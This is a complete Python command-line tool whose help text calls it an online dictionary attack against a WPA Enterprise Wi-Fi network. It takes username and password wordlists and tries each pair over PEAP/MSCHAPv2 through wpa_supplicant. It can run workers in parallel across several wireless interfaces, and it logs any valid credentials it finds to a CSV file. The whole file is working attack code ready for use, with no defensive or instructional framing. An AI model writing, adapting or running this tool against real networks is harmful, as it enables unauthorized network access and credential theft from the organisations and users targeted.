#!/usr/bin/env python3

import argparse
import csv
import datetime
import queue
import sys
import threading
import time
from contextlib import suppress

DEFAULT_MAX_WAIT = 4.5
DEFAULT_TEST_INTERVAL = 0.01


def timestamp():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def load_wordlist(path):
    with open(path, "r", encoding="utf-8", errors="replace") as handle:
        return [line.rstrip("\r\n") for line in handle if line.rstrip("\r\n")]


def build_attempts(users, passwords, start):
    attempt_id = 0
    for password in passwords:
        for user_index in range(start, len(users)):
            yield attempt_id, user_index, users[user_index], password
            attempt_id += 1


def write_valid_credential(outfile, ssid, username, password, csv_lock):
    if not outfile:
        return

    with csv_lock:
        with open(outfile, "a", encoding="utf-8", newline="") as handle:
            writer = csv.writer(handle)
            writer.writerow([timestamp(), ssid, username, password])


def connect_to_wifi(
    *,
    ssid,
    password,
    username,
    interface,
    outfile=None,
    print_lock=None,
    csv_lock=None,
    max_wait=DEFAULT_MAX_WAIT,
    test_interval=DEFAULT_TEST_INTERVAL,
    authentication="wpa-enterprise",
):
    valid_credentials_found = False
    target_network = None

    with print_lock:
        print(f"Trying {username}:{password}...")

    if authentication == "wpa-enterprise":
        network_params = {
            "ssid": ssid,
            "key_mgmt": "WPA-EAP",
            "eap": "PEAP",
            "identity": username,
            "password": password,
            "phase2": "auth=MSCHAPV2",
        }
    else:
        raise ValueError(f"Unsupported authentication mode: {authentication}")

    try:
        for network in interface.get_networks():
            interface.remove_network(network.get_path())

        interface.add_network(network_params)
        target_network = interface.get_networks()[0].get_path()
        interface.select_network(target_network)

        seconds_passed = 0.0
        while seconds_passed <= max_wait:
            state = interface.get_state()
            if state == "completed":
                valid_credentials_found = True
                break

            time.sleep(test_interval)
            seconds_passed += test_interval

        if valid_credentials_found:
            with print_lock:
                print(f"[!] VALID CREDENTIALS: {username}:{password}")
            write_valid_credential(outfile, ssid, username, password, csv_lock)

    finally:
        with suppress(Exception):
            interface.disconnect_network()

        if target_network is not None:
            with suppress(Exception):
                interface.remove_network(target_network)

    return valid_credentials_found


def get_or_create_interface(supplicant, device):
    try:
        return supplicant.get_interface(device)
    except Exception:
        return supplicant.create_interface(device)


def worker(
    *,
    worker_id,
    device,
    driver_class,
    reactor,
    args,
    attempts,
    stop_event,
    print_lock,
    csv_lock,
):
    driver = driver_class(reactor)
    supplicant = driver.connect()
    interface = get_or_create_interface(supplicant, device)

    while not stop_event.is_set():
        try:
            attempt_id, user_index, username, password = attempts.get_nowait()
        except queue.Empty:
            return

        try:
            with print_lock:
                print(f"[{user_index}] ({device}/worker-{worker_id}) ", end="", flush=True)

            valid_credentials_found = connect_to_wifi(
                ssid=args.ssid,
                username=str(username),
                password=str(password),
                interface=interface,
                outfile=args.outfile,
                print_lock=print_lock,
                csv_lock=csv_lock,
                max_wait=args.max_wait,
                test_interval=args.test_interval,
            )

            if valid_credentials_found and args.stop_on_success:
                stop_event.set()
                return

            if args.attempt_delay > 0:
                time.sleep(args.attempt_delay)

        except Exception as exc:
            with print_lock:
                print(f"[!] {device}/worker-{worker_id} failed attempt {attempt_id}: {exc}")
        finally:
            attempts.task_done()


def parse_args(argv):
    description = "Perform an online, horizontal dictionary attack against a WPA Enterprise network."
    parser = argparse.ArgumentParser(
        description=description,
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument(
        "-i",
        type=str,
        required=True,
        metavar="interface[,interface...]",
        dest="devices",
        help="Wireless interface, or comma-separated interfaces for concurrent attempts",
    )
    parser.add_argument("-e", type=str, required=True, dest="ssid", help="SSID of the target network")
    parser.add_argument("-u", type=str, required=True, dest="userfile", help="Username wordlist")
    parser.add_argument("-P", dest="password", default=None, help="Password to try on each username")
    parser.add_argument("-p", dest="passfile", default=None, help="List of passwords to try for each username")
    parser.add_argument(
        "-s",
        type=int,
        default=0,
        dest="start",
        metavar="line",
        help="Optional start line to resume attack. May not be used with a password list.",
    )
    parser.add_argument("-w", type=str, default=None, dest="outfile", help="Save valid credentials to a CSV file")
    parser.add_argument(
        "-1",
        default=False,
        dest="stop_on_success",
        action="store_true",
        help="Stop after the first set of valid credentials are found",
    )
    parser.add_argument(
        "-t",
        default=0.5,
        metavar="seconds",
        type=float,
        dest="attempt_delay",
        help="Seconds to sleep between each connection attempt per worker",
    )
    parser.add_argument(
        "--max-wait",
        default=DEFAULT_MAX_WAIT,
        metavar="seconds",
        type=float,
        help="Maximum seconds to wait for a successful association per attempt",
    )
    parser.add_argument(
        "--test-interval",
        default=DEFAULT_TEST_INTERVAL,
        metavar="seconds",
        type=float,
        help="Polling interval while waiting for association state",
    )
    return parser.parse_args(argv)


def validate_args(args):
    if args.password is None and args.passfile is None:
        raise SystemExit("You must specify a password or password list.")

    if args.password is not None and args.passfile is not None:
        raise SystemExit("Specify either a password or password list, not both.")

    if args.start != 0 and args.passfile is not None:
        raise SystemExit("The start line option may not be used with a password list.")

    if args.start < 0:
        raise SystemExit("The start line must be zero or greater.")

    if args.max_wait <= 0:
        raise SystemExit("--max-wait must be greater than 0.")

    if args.test_interval <= 0:
        raise SystemExit("--test-interval must be greater than 0.")


def load_runtime_dependencies():
    try:
        from twisted.internet.selectreactor import SelectReactor
        from wpa_supplicant.core import WpaSupplicantDriver
    except ImportError as exc:
        raise SystemExit(
            f"Missing runtime dependency: {exc.name}. "
            "Install dependencies with: pip3 install twisted wpa_supplicant"
        ) from exc

    return SelectReactor, WpaSupplicantDriver


def main(argv=None):
    args = parse_args(argv or sys.argv[1:])
    validate_args(args)

    devices = [device.strip() for device in args.devices.split(",") if device.strip()]
    if not devices:
        raise SystemExit("At least one wireless interface is required.")

    users = load_wordlist(args.userfile)
    if args.start >= len(users):
        raise SystemExit("The start line is beyond the end of the username list.")

    passwords = load_wordlist(args.passfile) if args.passfile else [args.password]
    worker_count = len(devices)

    attempts = queue.Queue()
    for attempt in build_attempts(users, passwords, args.start):
        attempts.put(attempt)

    print_lock = threading.Lock()
    csv_lock = threading.Lock()
    stop_event = threading.Event()

    select_reactor_class, driver_class = load_runtime_dependencies()
    reactor = select_reactor_class()
    reactor_thread = threading.Thread(
        target=reactor.run,
        kwargs={"installSignalHandlers": 0},
        daemon=True,
    )
    reactor_thread.start()
    time.sleep(0.1)

    threads = []
    try:
        if worker_count == 1:
            print("[*] Running sequentially with one wireless interface.")
        else:
            print(f"[*] Running {worker_count} workers across {worker_count} wireless interfaces.")

        for worker_id, device in enumerate(devices[:worker_count], start=1):
            thread = threading.Thread(
                target=worker,
                kwargs={
                    "worker_id": worker_id,
                    "device": device,
                    "driver_class": driver_class,
                    "reactor": reactor,
                    "args": args,
                    "attempts": attempts,
                    "stop_event": stop_event,
                    "print_lock": print_lock,
                    "csv_lock": csv_lock,
                },
            )
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

        print("DONE!")

    except KeyboardInterrupt:
        stop_event.set()
        print("Attack stopped by user.")
    finally:
        if reactor.running:
            reactor.sigBreak()
        reactor_thread.join(timeout=2)


if __name__ == "__main__":
    main()
